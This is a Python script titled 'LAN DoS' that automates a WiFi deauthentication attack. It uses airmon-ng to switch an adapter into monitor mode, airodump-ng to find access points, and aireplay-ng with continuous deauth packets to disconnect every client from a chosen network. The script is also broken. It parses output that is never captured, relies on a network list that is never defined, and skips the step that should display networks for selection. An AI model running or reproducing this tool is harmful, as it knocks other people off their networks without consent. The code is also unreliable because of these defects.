import os
import re
import subprocess
import pyfiglet

# Basic user interface header using figlet.

pyfiglet.print_figlet("LAN DoS")

# If the user doesn't run the program with super user privileges, don't allow them to continue.
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

# Regex to find wireless interfaces, we're making the assumption they will all be wlan0 or higher.
wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"]))

# No WiFi Adapter connected.
if len(check_wifi_result) == 0:
    print("Please connect a WiFi controller and try again.")
    exit()

# Menu to select WiFi interface from
print("The following WiFi interfaces are available: ")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices.")

# For easy reference we call the picked interface hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Kill conflicting WiFi processes
print("WiFi adapter connected!\nNow let's kill conflicting processes:")

# subprocess.run(<list of command line arguments goes here>)
# The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# We run the iwconfig command to look for wireless interfaces.
# Killing all conflicting processes using airmon-ng
kill_conflict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless in Monitored mode
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen(<list of command line arguments goes here>)
# The Popen method opens a pipe from a command. The output is an open file that can be accessed by other programs.
# We run the iwconfig command to look for wireless interfaces.
# Discover access points
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# Ensure that the input choice is valid.
while True:
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# To make it easier to work with we assign the results to variables.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Change to the channel we want to perform the DOS attack on.
# Monitoring takes place on a different channel and we need to set it to that channel.
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
try:
    while True:
        print("Deauthenticating clients, press ctrl-c to stop")
except KeyboardInterrupt:
    print("Stop monitoring mode")
    # We run a subprocess.run command where we stop monitoring mode on the network adapter.
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    subprocess.run(["sudo", "service", "NetworkManager", "restart", hacknic + "mon"])
    print("Thank you! Exiting now")
